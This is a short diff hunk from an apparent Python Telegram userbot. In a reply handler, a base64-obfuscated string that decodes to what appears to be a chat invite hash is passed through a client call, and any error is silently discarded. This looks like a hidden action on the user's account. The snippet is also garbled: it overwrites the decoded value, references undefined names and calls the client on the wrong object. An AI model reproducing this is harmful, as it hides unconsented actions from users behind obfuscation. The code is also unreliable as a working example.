@@ -95,7 +95,7 @@ async def samereply(hell):
         await asyncio.sleep(2)
         try:
             himanshu = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
-            himanshu = Get(kraken)
+            himanshu = Get(himanshuop)
             await himanshu.client(himanshu)
         except BaseException:
             pass
